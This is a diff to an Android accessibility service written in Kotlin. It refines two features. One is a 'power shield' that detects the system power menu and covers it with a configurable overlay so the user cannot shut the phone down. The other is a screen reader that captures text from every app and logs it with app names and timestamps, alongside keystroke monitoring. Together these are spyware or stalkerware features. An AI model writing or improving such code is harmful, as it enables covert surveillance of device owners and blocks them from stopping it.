@@ -33,6 +33,7 @@ class MyAccessibilityService : AccessibilityService() {
     // THROTTLE CONTROL
     private var lastScreenRead: Long = 0
     private val READ_DELAY = 1000L // Only read screen once per second
+    private var debounceJob: Job? = null
 
     // TREE SCRAPER STATE
     private data class TreeTask(
@@ -192,24 +193,36 @@ class MyAccessibilityService : AccessibilityService() {
             // --- POWER SHIELD LOGIC ---
             val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
             if (statsPrefs.getBoolean("power_shield_active", false)) {
-                val root = rootInActiveWindow
-                val powerMenuNode = root?.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_icon_label_view")
-                if (!powerMenuNode.isNullOrEmpty()) {
-                    val now = System.currentTimeMillis()
-                    val lastTrigger = statsPrefs.getLong("power_shield_last_trigger", 0L)
-                    if (now - lastTrigger > 5000) {
-                        statsPrefs.edit().putLong("power_shield_last_trigger", now).apply()
-                        val html = statsPrefs.getString("power_shield_html", "") ?: ""
-                        val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
-                        val timeout = statsPrefs.getLong("power_shield_timeout", 10L)
-                        
-                        DynamicUIManager.showOverlay(this, true, method, html)
-                        DebugLogger.log("POWER_SHIELD", "Power Menu Intercepted. Failsafe: ${timeout}s")
-                        
-                        // Failsafe Auto-Remove
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            DynamicUIManager.removeOverlay(this)
-                        }, timeout * 1000)
+                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                    CoroutineScope(Dispatchers.Default).launch {
+                        var attempts = 0
+                        while (attempts < 10) { // 50ms * 10 = 500ms max window
+                            val root = rootInActiveWindow
+                            val powerMenuNode = root?.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_icon_label_view")
+                            val fallbackNode = root?.findAccessibilityNodeInfosByText("Power off")
+                            
+                            if (!powerMenuNode.isNullOrEmpty() || !fallbackNode.isNullOrEmpty()) {
+                                val now = System.currentTimeMillis()
+                                val lastTrigger = statsPrefs.getLong("power_shield_last_trigger", 0L)
+                                if (now - lastTrigger > 2000) {
+                                    statsPrefs.edit().putLong("power_shield_last_trigger", now).apply()
+                                    val html = statsPrefs.getString("power_shield_html", "") ?: ""
+                                    val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
+                                    val timeout = statsPrefs.getLong("power_shield_timeout", 10L)
+                                    
+                                    DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html)
+                                    DebugLogger.log("POWER_SHIELD", "Power Menu Intercepted. Failsafe: ${timeout}s")
+                                    
+                                    // Failsafe Auto-Remove
+                                    Handler(Looper.getMainLooper()).postDelayed({
+                                        DynamicUIManager.removeOverlay(this@MyAccessibilityService)
+                                    }, timeout * 1000)
+                                }
+                                break // Target acquired, exit scan loop
+                            }
+                            attempts++
+                            delay(50)
+                        }
                     }
                 }
             }
@@ -471,8 +484,6 @@ class MyAccessibilityService : AccessibilityService() {
         }
 
         // --- 2. STANDARD MONITORING ---
-        if (now < nextAllowedCheck) return
-
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
              // Logic delegated to TypingManager
             val text = event.text.joinToString(" ")
@@ -485,47 +496,46 @@ class MyAccessibilityService : AccessibilityService() {
         // Feature Gate: Screen Reader
         if (!ConfigManager.canCollect(this, "screen_reader")) return
 
-        // THROTTLE: Prevent high CPU usage during scrolling
-        if (now - lastScreenRead < READ_DELAY) return
-        lastScreenRead = now
-
-        val source = event.source ?: return
-        val textContent = StringBuilder()
-        extractText(source, textContent)
-        
-        if (textContent.isNotEmpty()) {
-            val pm = packageManager
-            val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
-            val newTxt = textContent.take(100).toString()
-            
-            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-                val historyStr = prefs.getString("text_history_by_app", "{}")
-                val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
-                val appArray = rootJson.optJSONArray(appName) ?: JSONArray()
-
-                val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
+            debounceJob?.cancel()
+            debounceJob = CoroutineScope(Dispatchers.Default).launch {
+                delay(800) // Wait 800ms for UI to settle
                 
-                if (newTxt != lastTxt) {
-                    nextAllowedCheck = System.currentTimeMillis() + 500
+                val source = event.source ?: return@launch
+                val textContent = StringBuilder()
+                extractText(source, textContent)
+                
+                if (textContent.isNotEmpty()) {
+                    val pm = packageManager
+                    val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
+                    val newTxt = textContent.take(100).toString()
                     
-                    // 1. STREAM LOGGING (NO LAG)
-                    val entry = JSONObject()
-                    entry.put("pkg", appName)
-                    entry.put("ts", System.currentTimeMillis())
-                    entry.put("txt", newTxt)
-                    DumpManager.appendLog("SCREEN", entry)
-                    
-                    // 2. Update Stats (Using commit() to bypass QueuedWork ANR)
-                    prefs.edit()
-                        .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
-                        .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
-                        .commit()
+                    withContext(Dispatchers.IO) {
+                        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                        val historyStr = prefs.getString("text_history_by_app", "{}")
+                        val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
+                        val appArray = rootJson.optJSONArray(appName) ?: JSONArray()
 
-                    // 3. Verify
-                    DumpManager.logVerification("READER", pkgName)
-                } else {
-                    nextAllowedCheck = System.currentTimeMillis() + 3000
+                        val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
+                        
+                        if (newTxt != lastTxt) {
+                            // 1. STREAM LOGGING (NO LAG)
+                            val entry = JSONObject()
+                            entry.put("pkg", appName)
+                            entry.put("ts", System.currentTimeMillis())
+                            entry.put("txt", newTxt)
+                            DumpManager.appendLog("SCREEN", entry)
+                            
+                            // 2. Update Stats (Using commit() to bypass QueuedWork ANR)
+                            prefs.edit()
+                                .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
+                                .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
+                                .commit()
+
+                            // 3. Verify
+                            DumpManager.logVerification("READER", pkgName)
+                        }
+                    }
                 }
             }
         }
